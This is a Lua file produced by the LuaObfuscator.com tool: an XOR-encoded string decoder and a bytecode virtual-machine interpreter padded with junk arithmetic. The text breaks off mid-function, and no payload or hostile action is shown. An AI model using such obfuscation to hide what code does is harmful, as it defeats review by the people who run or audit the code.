--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (v26 == 0) then
				v27 = {};
				for v44 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v44, v44 + 1)), v1(v2(v25, 1 + ((v44 - 1) % #v25), 1 + ((v44 - 1) % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
			if (v26 == 1) then
				return v5(v27);
			end
		end
	end
	local v8 = _G[v7("\174\13\184\254\183\0\179\249", "\218\98\214\139")];
	local v9 = _G[v7("\178\93\57\221\175\78", "\193\41\75\180")][v7("\170\51\196\143", "\200\74\176\234\226\141\73")];
	local v10 = _G[v7("\154\168\216\28\141\252", "\233\220\170\117\227\155\101\131")][v7("\161\124\46\194", "\194\20\79\176")];
	local v11 = _G[v7("\48\229\75\61\45\246", "\67\145\57\84")][v7("\200\0\29", "\187\117\127\145\233\111\64")];
	local v12 = _G[v7("\70\230\238\68\91\245", "\53\146\156\45")][v7("\246\70\189\57", "\145\53\200\91\121\161\90\43")];
	local v13 = _G[v7("\83\224\210\53\54\71", "\32\148\160\92\88")][v7("\24\121\11", "\106\28\123\48\56")];
	local v14 = _G[v7("\47\77\224\169\91", "\91\44\130\197\62\137\231\114")][v7("\93\84\3\228\211\74", "\62\59\109\135\178")];
	local v15 = _G[v7("\50\51\113\124\251", "\70\82\19\16\158\74\165")][v7("\39\207\49\193\60\213", "\78\161\66\164")];
	local v16 = _G[v7("\41\116\68\18", "\68\21\48\122\74\44")][v7("\208\163\43\221\161", "\188\199\78\165\209\50\54\187")];
	local v17 = _G[v7("\74\142\76\120\170\67\157", "\45\235\56\30\207")] or function()
		return _ENV;
	end;
	local v18 = _G[v7("\195\204\246\34\141\225\209\221\227\45\132\240", "\176\169\130\79\232\149")];
	local v19 = _G[v7("\236\194\241\254\129", "\156\161\144\146\237\22\217\82")];
	local v20 = _G[v7("\194\11\214\18\210\26", "\177\110\186\119")];
	local v21 = _G[v7("\111\230\240\114\121\227", "\26\136\128\19")] or _G[v7("\14\249\122\252\126", "\122\152\24\144\27")][v7("\221\187\183\243\241\54", "\168\213\199\146\146\93")];
	local v22 = _G[v7("\236\196\115\96\209\249\180\165", "\152\171\29\21\188\155\209\215")];
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v30 == 3) then
				v43 = nil;
				while true do
					local v45 = 0;
					while true do
						if (v45 == 3) then
							if (v31 == 6) then
								local v46 = 0;
								while true do
									if (v46 == 0) then
										v42 = nil;
										function v42()
											local v54 = 0;
											local v55;
											local v56;
											local v57;
											local v58;
											local v59;
											local v60;
											local v61;
											while true do
												if (v54 == 2) then
													v59 = nil;
													v60 = nil;
													v54 = 3;
												end
												if (v54 == 1) then
													v57 = nil;
													v58 = nil;
													v54 = 2;
												end
												if (v54 == 3) then
													v61 = nil;
													while true do
														local v111 = 0;
														while true do
															if (v111 == 1) then
																if (v55 == 1) then
																	local v121 = 0;
																	while true do
																		if (v121 == 1) then
																			for v143 = 1 + 0, v60 do
																				local v144 = 0;
																				local v145;
																				local v146;
																				local v147;
																				while true do
																					if (v144 == 1) then
																						v147 = nil;
																						while true do
																							if (0 == v145) then
																								local v170 = 0;
																								while true do
																									if (v170 == 1) then
																										v145 = 1;
																										break;
																									end
																									if (0 == v170) then
																										v146 = v35();
																										v147 = nil;
																										v170 = 1;
																									end
																								end
																							end
																							if (v145 == 1) then
																								if (v146 == ((1999 - (663 + 1332)) - (5 - 2))) then
																									v147 = v35() ~= ((423 - (301 + 122)) - 0);
																								elseif (v146 == (1252 - (505 + 745))) then
																									v147 = v38();
																								elseif (v146 == (1603 - (1021 + 579))) then
																									v147 = v39();
																								end
																								v61[v143] = v147;
																								break;
																							end
																						end
																						break;
																					end
																					if (v144 == 0) then
																						v145 = 0;
																						v146 = nil;
																						v144 = 1;
																					end
																				end
																			end
																			v59[1 + 2 + 0] = v35();
																			v121 = 2;
																		end
																		if (v121 == 0) then
																			v60 = v37();
																			v61 = {};
																			v121 = 1;
																		end
																		if (2 == v121) then
																			v55 = 2;
																			break;
																		end
																	end
																end
																break;
															end
															if (v111 == 0) then
																if (v55 == 0) then
																	local v122 = 0;
																	while true do
																		if (v122 == 2) then
																			v55 = 1;
																			break;
																		end
																		if (v122 == 1) then
																			v58 = {};
																			v59 = {v56,v57,nil,v58};
																			v122 = 2;
																		end
																		if (v122 == 0) then
																			v56 = {};
																			v57 = {};
																			v122 = 1;
																		end
																	end
																end
																if (2 == v55) then
																	local v123 = 0;
																	while true do
																		if (v123 == 0) then
																			for v148 = 1 + 0, v37() do
																				local v149 = 0;
																				local v150;
																				local v151;
																				while true do
																					if (v149 == 1) then
																						while true do
																							if (v150 == 0) then
																								v151 = v35();
																								if (v34(v151, (1363 + 522) - ((3630 - (1103 + 679)) + 7 + 29), 48 - (42 + 5)) == (0 - 0)) then
																									local v176 = 0;
																									local v177;
																									local v178;
																									local v179;
																									local v180;
																									while true do
																										if (v176 == 2) then
																											while true do
																												if (v177 == 0) then
																													local v195 = 0;
																													while true do
																														if (v195 == 1) then
																															v177 = 1;
																															break;
																														end
																														if (0 == v195) then
																															v178 = v34(v151, 2, 903 - (442 + 458));
																															v179 = v34(v151, 8 - 4, 3 + 3);
																															v195 = 1;
																														end
																													end
																												end
																												if (v177 == 3) then
																													if (v34(v179, (1697 - (26 + 139)) - (723 + 277 + (1780 - (343 + 908))), 9 - 6) == 1) then
																														v180[4] = v61[v180[4]];
																													end
																													v56[v148] = v180;
																													break;
																												end
																												if (1 == v177) then
																													local v197 = 0;
																													while true do
																														if (v197 == 0) then
																															v180 = {v36(),v36(),nil,nil};
																															if (v178 == (0 + 0)) then
																																local v208 = 0;
																																local v209;
																																while true do
																																	if (v208 == 0) then
																																		v209 = 0;
																																		while true do
																																			if (v209 == 0) then
																																				v180[3] = v36();
																																				v180[1 + 3] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															elseif (v178 == (1139 - (814 + (1567 - (979 + 264))))) then
																																v180[3 + 0] = v37();
																															elseif (v178 == ((2895 - (564 + 436)) - (782 + 347 + 363 + 401))) then
																																v180[3] = v37() - ((1404 - (294 + 1108)) ^ (42 - 26));
																															elseif (v178 == (7 - 4)) then
																																local v221 = 0;
																																local v222;
																																while true do
																																	if (v221 == 0) then
																																		v222 = 0;
																																		while true do
																																			if (v222 == 0) then
																																				v180[3 + 0] = v37() - ((4 - (389 - (89 + 298))) ^ (1 + 15));
																																				v180[4] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															v197 = 1;
																														end
																														if (1 == v197) then
																															v177 = 2;
																															break;
																														end
																													end
																												end
																												if (v177 == 2) then
																													local v198 = 0;
																													while true do
																														if (v198 == 0) then
																															if (v34(v179, (4 + 0) - 3, 1 + 0 + 0) == (1 + 0)) then
																																v180[(8 + 1) - (3 + 4)] = v61[v180[617 - (44 + 53 + 208 + 310)]];
																															end
																															if (v34(v179, 3 - 1, 2) == (3 - 2)) then
																																v180[782 - (513 + 266)] = v61[v180[(1990 - (1227 + 751)) - (4 + 5)]];
																															end
																															v198 = 1;
																														end
																														if (v198 == 1) then
																															v177 = 3;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																										if (v176 == 1) then
																											v179 = nil;
																											v180 = nil;
																											v176 = 2;
																										end
																										if (v176 == 0) then
																											v177 = 0;
																											v178 = nil;
																											v176 = 1;
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if (v149 == 0) then
																						v150 = 0;
																						v151 = nil;
																						v149 = 1;
																					end
																				end
																			end
																			for v152 = 1, v37() do
																				v57[v152 - ((1 + 1) - 1)] = v42();
																			end
																			v123 = 1;
																		end
																		if (1 == v123) then
																			for v154 = 1, v37() do
																				v58[v154] = v37();
																			end
																			return v59;
																		end
																	end
																end
																v111 = 1;
															end
														end
													end
													break;
												end
												if (v54 == 0) then
													v55 = 0;
													v56 = nil;
													v54 = 1;
												end
											end
										end
										v46 = 1;
									end
									if (v46 == 1) then
										v43 = nil;
										v31 = 7;
										break;
									end
								end
							end
							if (4 == v31) then
								local v47 = 0;
								while true do
									if (v47 == 0) then
										function v38()
											local v62 = 0;
											local v63;
											local v64;
											local v65;
											local v66;
											local v67;
											local v68;
											local v69;
											while true do
												if (v62 == 1) then
													v65 = nil;
													v66 = nil;
													v62 = 2;
												end
												if (v62 == 2) then
													v67 = nil;
													v68 = nil;
													v62 = 3;
												end
												if (v62 == 0) then
													v63 = 0 - 0;
													v64 = nil;
													v62 = 1;
												end
												if (v62 == 3) then
													v69 = nil;
													while true do
														local v112 = 0;
														while true do
															if (0 == v112) then
																if (v63 == (4 - 1)) then
																	local v124 = 0;
																	while true do
																		if (0 == v124) then
																			if (v68 == (80 - (((8 + 87) - (21 + 17)) + (1918 - (217 + 1249 + 429))))) then
																				if (v67 == (0 + 0 + 0 + 0 + (0 - 0))) then
																					return v69 * ((0 + 0) - ((684 + 62) - ((1934 - (29 + 1177)) + 18)));
																				else
																					local v168 = 0;
																					local v169;
																					while true do
																						if (v168 == 0) then
																							v169 = 461 - (39 + 422);
																							while true do
																								if (v169 == 0) then
																									v68 = 2 - 1;
																									v66 = 0 - ((917 + 637) - (669 + 885));
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																			elseif (v68 == (2993 - ((2301 - (82 + 1410)) + 137))) then
																				return ((v67 == ((1297 - (1424 - (315 + 667))) - (((261 - 192) - (1366 - (1205 + 127))) + 820))) and (v69 * ((165 - ((247 - 119) + 36)) / ((1285 - (907 + (495 - 156))) - (23 + (15 - 5) + 6))))) or (v69 * NaN);
																			end
																			return v16(v69, v68 - ((1204 - (231 + 149)) + 199)) * (v66 + (v67 / (((1556 - (65 + 146)) - (212 + 493 + 510 + 128)) ^ ((1279 - (509 + (885 - 516))) - ((790 - 552) + (922 - (754 + 165)) + 65 + 15 + 28)))));
																		end
																	end
																end
																if (1 == v63) then
																	local v125 = 0;
																	while true do
																		if (v125 == 1) then
																			v63 = 2;
																			break;
																		end
																		if (v125 == 0) then
																			v66 = 2 - (752 - (141 + 610));
																			v67 = (v34(v65, 1 + (1747 - (1399 + 348)), (431 + (720 - 505)) - (197 + ((1438 - 798) - 211))) * ((5 - 3) ^ (54 - 22))) + v64;
																			v125 = 1;
																		end
																	end
																end
																v112 = 1;
															end
															if (v112 == 1) then
																if (v63 == (1 + 1)) then
																	local v126 = 0;
																	while true do
																		if (v126 == 0) then
																			v68 = v34(v65, 51 - 30, 16 + 15);
																			v69 = ((v34(v65, 539 - (59 + (669 - 221))) == (1 + 0 + (1432 - (304 + 1128)))) and -((1561 - (1337 + 223)) + ((0 + 0) - 0))) or 1;
																			v126 = 1;
																		end
																		if (v126 == 1) then
																			v63 = 3;
																			break;
																		end
																	end
																end
																if (v63 == 0) then
																	local v127 = 0;
																	while true do
																		if (v127 == 0) then
																			v64 = v37();
																			v65 = v37();
																			v127 = 1;
																		end
																		if (v127 == 1) then
																			v63 = 1;
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v39 = nil;
										v47 = 1;
									end
									if (v47 == 1) then
										function v39(v70)
											local v71 = 0;
											local v72;
											local v73;
											local v74;
											while true do
												if (v71 == 1) then
													v74 = nil;
													while true do
														local v113 = 0;
														while true do
															if (v113 == 0) then
																if (v72 == (115 - (7 + 106))) then
																	local v128 = 0;
																	while true do
																		if (v128 == 1) then
																			v72 = 3;
																			break;
																		end
																		if (v128 == 0) then
																			v74 = {};
																			for v156 = (2 + 0) - (308 - (304 + 3)), #v73 do
																				v74[v156] = v10(v9(v11(v73, v156, v156)));
																			end
																			v128 = 1;
																		end
																	end
																end
																if (v72 == 1) then
																	local v129 = 0;
																	while true do
																		if (v129 == 1) then
																			v72 = 2 + 0;
																			break;
																		end
																		if (v129 == 0) then
																			v73 = v11(v28, v32, (v32 + v70) - ((1614 - (1465 + 146)) - ((277 + 231) - (159 + 165 + 182))));
																			v32 = v32 + v70;
																			v129 = 1;
																		end
																	end
																end
																v113 = 1;
															end
															if (v113 == 1) then
																if (v72 == (0 + 0)) then
																	local v130 = 0;
																	while true do
																		if (1 == v130) then
																			v72 = 1;
																			break;
																		end
																		if (v130 == 0) then
																			v73 = nil;
																			if not v70 then
																				local v165 = 0;
																				local v166;
																				while true do
																					if (0 == v165) then
																						v166 = 0 + 0;
																						while true do
																							if (v166 == 0) then
																								v70 = v37();
																								if (v70 == (0 + (0 - 0))) then
																									return "";
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v130 = 1;
																		end
																	end
																end
																if (v72 == (8 - 5)) then
																	return v14(v74);
																end
																break;
															end
														end
													end
													break;
												end
												if (v71 == 0) then
													v72 = 0;
													v73 = nil;
													v71 = 1;
												end
											end
										end
										v31 = 5;
										break;
									end
								end
							end
							break;
						end
						if (v45 == 0) then
							if (v31 == 2) then
								local v48 = 0;
								while true do
									if (v48 == 1) then
										function v36()
											local v75 = 0;
											local v76;
											local v77;
											local v78;
											while true do
												if (1 == v75) then
													v78 = nil;
													while true do
														local v114 = 0;
														while true do
															if (v114 == 0) then
																if (v76 == 1) then
																	return (v78 * (9 + 247)) + v77;
																end
																if (v76 == (0 - 0)) then
																	local v131 = 0;
																	while true do
																		if (v131 == 1) then
																			v76 = 1;
																			break;
																		end
																		if (v131 == 0) then
																			v77, v78 = v9(v28, v32, v32 + ((1 + 1) - (0 + 0)));
																			v32 = v32 + (309 - ((226 - (172 - 100)) + 55 + 98));
																			v131 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v75 == 0) then
													v76 = 0 - 0;
													v77 = nil;
													v75 = 1;
												end
											end
										end
										v31 = 3;
										break;
									end
									if (v48 == 0) then
										function v35()
											local v79 = 0;
											local v80;
											local v81;
											while true do
												if (v79 == 0) then
													v80 = 0;
													v81 = nil;
													v79 = 1;
												end
												if (1 == v79) then
													while true do
														local v115 = 0;
														while true do
															if (v115 == 0) then
																if ((0 - 0) == v80) then
																	local v132 = 0;
																	while true do
																		if (v132 == 0) then
																			v81 = v9(v28, v32, v32);
																			v32 = v32 + (1 - 0);
																			v132 = 1;
																		end
																		if (v132 == 1) then
																			v80 = 1;
																			break;
																		end
																	end
																end
																if (1 == v80) then
																	return v81;
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v36 = nil;
										v48 = 1;
									end
								end
							end
							if (v31 == 3) then
								local v49 = 0;
								while true do
									if (v49 == 0) then
										v37 = nil;
										function v37()
											local v82 = 0;
											local v83;
											local v84;
											local v85;
											local v86;
											local v87;
											while true do
												if (v82 == 2) then
													v87 = nil;
													while true do
														local v116 = 0;
														while true do
															if (0 == v116) then
																if ((0 + 0) == v83) then
																	local v133 = 0;
																	while true do
																		if (v133 == 0) then
																			v84, v85, v86, v87 = v9(v28, v32, v32 + 1 + 0 + (477 - (437 + 38)));
																			v32 = v32 + 3 + 0 + 1;
																			v133 = 1;
																		end
																		if (v133 == 1) then
																			v83 = 1;
																			break;
																		end
																	end
																end
																if (v83 == 1) then
																	return (v87 * ((9913146 + 6865333) - (8 + 519 + 84 + 336 + 316))) + (v86 * ((60517 + 5329) - ((289 - (114 + 121)) + (2007 - (137 + 1614))))) + (v85 * (560 - (1223 - (841 + (208 - 130))))) + v84;
																end
																break;
															end
														end
													end
													break;
												end
												if (v82 == 1) then
													v85 = nil;
													v86 = nil;
													v82 = 2;
												end
												if (v82 == 0) then
													v83 = 0;
													v84 = nil;
													v82 = 1;
												end
											end
										end
										v49 = 1;
									end
									if (v49 == 1) then
										v38 = nil;
										v31 = 4;
										break;
									end
								end
							end
							v45 = 1;
						end
						if (v45 == 1) then
							if (v31 == 5) then
								local v50 = 0;
								while true do
									if (v50 == 0) then
										v40 = v37;
										v41 = nil;
										v50 = 1;
									end
									if (v50 == 1) then
										function v41(...)
											return {...}, v20("#", ...);
										end
										v31 = 6;
										break;
									end
								end
							end
							if (1 == v31) then
								local v51 = 0;
								while true do
									if (v51 == 1) then
										v35 = nil;
										v31 = 2;
										break;
									end
									if (v51 == 0) then
										v34 = nil;
										function v34(v88, v89, v90)
											if v90 then
												local v100 = 0;
												local v101;
												local v102;
												while true do
													if (v100 == 0) then
														v101 = 0 - 0;
														v102 = nil;
														v100 = 1;
													end
													if (v100 == 1) then
														while true do
															if (v101 == 0) then
																local v118 = 0;
																while true do
																	if (v118 == 0) then
																		v102 = (v88 / ((1 + 1) ^ (v89 - (1 - (0 - 0))))) % ((1 + 1) ^ (((v90 - (1 + 0 + 0)) - (v89 - (1 - 0))) + 1 + 0 + 0));
																		return v102 - (v102 % (((1 + 2) - 2) + (0 - 0) + (0 - 0)));
																	end
																end
															end
														end
														break;
													end
												end
											else
												local v103 = 0;
												local v104;
												local v105;
												while true do
													if (v103 == 0) then
														v104 = 0;
														v105 = nil;
														v103 = 1;
													end
													if (v103 == 1) then
														while true do
															if (0 == v104) then
																local v119 = 0;
																while true do
																	if (v119 == 0) then
																		v105 = 2 ^ (v89 - (((3 - 1) - 1) + (1052 - (221 + 831))));
																		return (((v88 % (v105 + v105)) >= v105) and (2 - 1)) or (1597 - (1130 + (2365 - (1648 + 250))));
																	end
																end
															end
														end
														break;
													end
												end
											end
										end
										v51 = 1;
									end
								end
							end
							v45 = 2;
						end
						if (v45 == 2) then
							if (v31 == 0) then
								local v52 = 0;
								while true do
									if (0 == v52) then
										v32 = 275 - (181 + 93);
										v33 = nil;
										v52 = 1;
									end
									if (v52 == 1) then
										v28 = v12(v11(v28, (521 - (23 + 497)) + 3 + 1), v7("\98\137", "\76\167\219\75\130\63"), function(v91)
											if (v9(v91, 2) == (53 + 26)) then
												local v106 = 0;
												local v107;
												while true do
													if (v106 == 0) then
														v107 = 0;
														while true do
															if (v107 == 0) then
																local v120 = 0;
																while true do
																	if (v120 == 0) then
																		v33 = v8(v11(v91, 1, 858 - (653 + 204)));
																		return "";
																	end
																end
															end
														end
														break;
													end
												end
											else
												local v108 = 0;
												local v109;
												local v110;
												while true do
													if (v108 == 0) then
														v109 = 0;
														v110 = nil;
														v108 = 1;
													end
													if (1 == v108) then
														while true do
															if (v109 == 0) then
																v110 = v10(v8(v91, 1384 - (400 + 178 + 790)));
																if v33 then
																	local v136 = 0;
																	local v137;
																	local v138;
																	while true do
																		if (v136 == 1) then
																			while true do
																				local v167 = 0;
																				while true do
																					if (v167 == 0) then
																						if (v137 == 1) then
																							return v138;
																						end
																						if (v137 == 0) then
																							local v172 = 0;
																							while true do
																								if (v172 == 0) then
																									v138 = v13(v110, v33);
																									v33 = nil;
																									v172 = 1;
																								end
																								if (v172 == 1) then
																									v137 = 1;
																									break;
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			break;
																		end
																		if (v136 == 0) then
																			v137 = 0;
																			v138 = nil;
																			v136 = 1;
																		end
																	end
																else
																	return v110;
																end
																break;
															end
														end
														break;
													end
												end
											end
										end);
										v31 = 1;
										break;
									end
								end
							end
							if (7 == v31) then
								local v53 = 0;
								while true do
									if (v53 == 0) then
										function v43(v92, v93, v94)
											local v95 = 0;
											local v96;
											local v97;
											local v98;
											local v99;
											while true do
												if (v95 == 2) then
													while true do
														local v117 = 0;
														while true do
															if (v117 == 0) then
																if (v96 == 0) then
																	local v134 = 0;
																	while true do
																		if (v134 == 0) then
																			v97 = v92[1974 - (1529 + 444)];
																			v98 = v92[2 + 0];
																			v134 = 1;
																		end
																		if (v134 == 1) then
																			v96 = 1;
																			break;
																		end
																	end
																end
																if (v96 == 1) then
																	local v135 = 0;
																	while true do
																		if (v135 == 0) then
																			v99 = v92[336 - (301 + 32)];
																			return function(...)
																				local v158 = 0;
																				local v159;
																				local v160;
																				local v161;
																				local v162;
																				local v163;
																				local v164;
																				while true do
																					if (v158 == 2) then
																						v163 = nil;
																						v164 = nil;
																						v158 = 3;
																					end
																					if (v158 == 0) then
																						v159 = 0;
																						v160 = nil;
																						v158 = 1;
																					end
																					if (v158 == 1) then
																						v161 = nil;
																						v162 = nil;
																						v158 = 2;
																					end
																					if (v158 == 3) then
																						while true do
																							if (3 == v159) then
																								_G['A'], _G['B'] = v41(v19(v164));
																								if not _G['A'][(503 - (125 + 376)) - 1] then
																									local v181 = 0;
																									local v182;
																									local v183;
																									while true do
																										if (v181 == 0) then
																											v182 = 0;
																											v183 = nil;
																											v181 = 1;
																										end
																										if (v181 == 1) then
																											while true do
																												if (v182 == 0) then
																													v183 = v92[1719 - (1338 + 377)][v160] or "?";
																													error(v7("\115\46\47\161\111\159\0\40\47\186\112\153\0\44\41\232\68", "\32\77\93\200\31\235") .. v183 .. v7("\26\108", "\71\86\17\227\72\186\122\62") .. _G['A'][2]);
																													break;
																												end
																											end
																											break;
																										end
																									end
																								else
																									return v21(_G['A'], 2 + 0, _G['B']);
																								end
																								break;
																							end
																							if (v159 == 1) then
																								local v173 = 0;
																								while true do
																									if (v173 == 1) then
																										v159 = 2;
																										break;
																									end
																									if (v173 == 0) then
																										v162 = {...};
																										v163 = v20("#", ...) - (1 - 0);
																										v173 = 1;
																									end
																								end
																							end
																							if (2 == v159) then
																								local v174 = 0;
																								while true do
																									if (v174 == 1) then
																										v159 = 3;
																										break;
																									end
																									if (0 == v174) then
																										v164 = nil;
																										function v164()
																											local v184 = 0;
																											local v185;
																											local v186;
																											local v187;
																											local v188;
																											local v189;
																											local v190;
																											local v191;
																											local v192;
																											local v193;
																											local v194;
																											while true do
																												if (v184 == 1) then
																													v189 = {};
																													v190 = {};
																													v191 = {};
																													for v199 = 0 + (453 - (135 + 318)), v163 do
																														if (v199 >= v187) then
																															v189[v199 - v187] = v162[v199 + (1593 - (72 + 1520)) + 0 + 0];
																														else
																															v191[v199] = v162[v199 + (857 - (713 + 143))];
																														end
																													end
																													v184 = 2;
																												end
																												if (0 == v184) then
																													v185 = v97;
																													v186 = v98;
																													v187 = v99;
																													v188 = v41;
																													v184 = 1;
																												end
																												if (v184 == 2) then
																													v192 = (v163 - v187) + (614 - (202 + 411)) + 0;
																													v193 = nil;
																													v194 = nil;
																													while true do
																														local v200 = 0;
																														local v201;
																														while true do
																															if (v200 == 0) then
																																v201 = 0;
																																while true do
																																	if (v201 == 1) then
																																		if (v194 <= 14) then
																																			if (v194 <= 6) then
																																				if (v194 <= 2) then
																																					if (v194 <= ((526 - (7 + 519)) - 0)) then
																																						v191[v193[4 - (9 - 7)]] = v191[v193[1170 - (837 + 330)]][v193[4]];
																																					elseif (v194 > 1) then
																																						local v227 = 0;
																																						local v228;
																																						local v229;
																																						while true do
																																							if (0 == v227) then
																																								v228 = 0;
																																								v229 = nil;
																																								v227 = 1;
																																							end
																																							if (1 == v227) then
																																								while true do
																																									if (v228 == 0) then
																																										v229 = v193[(1021 - 605) - ((565 - (46 + 302)) + 197)];
																																										do
																																											return v191[v229](v21(v191, v229 + (892 - (633 + 258)), v193[(1488 - 962) - ((678 - (398 + 196)) + (1165 - (21 + 705)))]));
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					else
																																						v191[v193[6 - 4]] = v191[v193[3]] - v193[4 + 0];
																																					end
																																				elseif (v194 <= 4) then
																																					if (v194 == (2 + 1)) then
																																						v160 = v193[3 - 0];
																																					else
																																						v191[v193[2]] = {};
																																					end
																																				elseif (v194 > (4 + 1)) then
																																					v191[v193[(492 - (483 + 4)) - 3]] = v191[v193[(25 - 15) - (204 - (182 + 15))]];
																																				else
																																					local v235 = 0;
																																					local v236;
																																					local v237;
																																					local v238;
																																					local v239;
																																					local v240;
																																					while true do
																																						if (v235 == 0) then
																																							v236 = 0;
																																							v237 = nil;
																																							v235 = 1;
																																						end
																																						if (v235 == 2) then
																																							v240 = nil;
																																							while true do
																																								if (v236 == 0) then
																																									local v300 = 0;
																																									while true do
																																										if (v300 == 0) then
																																											v237 = v193[1150 - (361 + 787)];
																																											v238, v239 = v188(v191[v237](v191[v237 + 1 + 0]));
																																											v300 = 1;
																																										end
																																										if (v300 == 1) then
																																											v236 = 1;
																																											break;
																																										end
																																									end
																																								end
																																								if (2 == v236) then
																																									for v323 = v237, v161 do
																																										local v324 = 0;
																																										local v325;
																																										while true do
																																											if (v324 == 0) then
																																												v325 = 0;
																																												while true do
																																													if (v325 == 0) then
																																														v240 = v240 + (2 - 1) + 0 + 0;
																																														v191[v323] = v238[v240];
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v236 == 1) then
																																									local v301 = 0;
																																									while true do
																																										if (0 == v301) then
																																											v161 = (v239 + v237) - (1 + 0);
																																											v240 = 0 - 0;
																																											v301 = 1;
																																										end
																																										if (v301 == 1) then
																																											v236 = 2;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v235 == 1) then
																																							v238 = nil;
																																							v239 = nil;
																																							v235 = 2;
																																						end
																																					end
																																				end
																																			elseif (v194 <= (15 - 5)) then
																																				if (v194 <= (9 - 1)) then
																																					if (v194 == (3 + 4)) then
																																						if not v191[v193[(2 + 0) - (1343 - (605 + 738))]] then
																																							v160 = v160 + 1;
																																						else
																																							v160 = v193[(1325 - 278) - (629 + 308 + 70 + 37)];
																																						end
																																					else
																																						local v241 = 0;
																																						local v242;
																																						local v243;
																																						local v244;
																																						while true do
																																							if (v241 == 1) then
																																								v244 = nil;
																																								while true do
																																									if (v242 == 1) then
																																										v191[v243 + (16 - (6 + 9))] = v244;
																																										v191[v243] = v244[v193[1228 - (827 + 397)]];
																																										break;
																																									end
																																									if (0 == v242) then
																																										local v305 = 0;
																																										while true do
																																											if (v305 == 0) then
																																												v243 = v193[1 + 1 + 0];
																																												v244 = v191[v193[1932 - (1553 + 376)]];
																																												v305 = 1;
																																											end
																																											if (v305 == 1) then
																																												v242 = 1;
																																												break;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (v241 == 0) then
																																								v242 = 0;
																																								v243 = nil;
																																								v241 = 1;
																																							end
																																						end
																																					end
																																				elseif (v194 == (17 - 8)) then
																																					local v245 = 0;
																																					local v246;
																																					local v247;
																																					local v248;
																																					local v249;
																																					while true do
																																						if (v245 == 2) then
																																							while true do
																																								if (v246 == 1) then
																																									local v306 = 0;
																																									while true do
																																										if (v306 == 1) then
																																											v246 = 2;
																																											break;
																																										end
																																										if (v306 == 0) then
																																											v249 = v191[v247] + v248;
																																											v191[v247] = v249;
																																											v306 = 1;
																																										end
																																									end
																																								end
																																								if (v246 == 0) then
																																									local v307 = 0;
																																									while true do
																																										if (v307 == 0) then
																																											v247 = v193[2];
																																											v248 = v191[v247 + (1181 - (836 + 343))];
																																											v307 = 1;
																																										end
																																										if (v307 == 1) then
																																											v246 = 1;
																																											break;
																																										end
																																									end
																																								end
																																								if (v246 == 2) then
																																									if (v248 > 0) then
																																										if (v249 <= v191[v247 + 1]) then
																																											local v347 = 0;
																																											local v348;
																																											while true do
																																												if (v347 == 0) then
																																													v348 = 0;
																																													while true do
																																														if (v348 == 0) then
																																															v160 = v193[182 - (178 + 1)];
																																															v191[v247 + (1392 - (33 + 1356))] = v249;
																																															break;
																																														end
																																													end
																																													break;
																																												end
																																											end
																																										end
																																									elseif (v249 >= v191[v247 + 1]) then
																																										local v349 = 0;
																																										local v350;
																																										while true do
																																											if (v349 == 0) then
																																												v350 = 0;
																																												while true do
																																													if (v350 == 0) then
																																														v160 = v193[1 + (2 - 0)];
																																														v191[v247 + (7 - 4)] = v249;
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (v245 == 0) then
																																							v246 = 0;
																																							v247 = nil;
																																							v245 = 1;
																																						end
																																						if (v245 == 1) then
																																							v248 = nil;
																																							v249 = nil;
																																							v245 = 2;
																																						end
																																					end
																																				else
																																					local v250 = 0;
																																					local v251;
																																					local v252;
																																					local v253;
																																					local v254;
																																					while true do
																																						if (v250 == 1) then
																																							v253 = nil;
																																							v254 = nil;
																																							v250 = 2;
																																						end
																																						if (v250 == 2) then
																																							while true do
																																								if (v251 == 0) then
																																									local v308 = 0;
																																									while true do
																																										if (v308 == 0) then
																																											v252 = v186[v193[(37 - 24) - (29 - 19)]];
																																											v253 = nil;
																																											v308 = 1;
																																										end
																																										if (1 == v308) then
																																											v251 = 1;
																																											break;
																																										end
																																									end
																																								end
																																								if (v251 == 1) then
																																									local v309 = 0;
																																									while true do
																																										if (v309 == 0) then
																																											v254 = {};
																																											v253 = v18({}, {[v7("\204\187\196\214\9\135\235", "\147\228\173\184\109\226")]=function(v351, v352)
																																												local v353 = 0;
																																												local v354;
																																												local v355;
																																												while true do
																																													if (v353 == 0) then
																																														v354 = 0;
																																														v355 = nil;
																																														v353 = 1;
																																													end
																																													if (v353 == 1) then
																																														while true do
																																															if (v354 == 0) then
																																																local v380 = 0;
																																																while true do
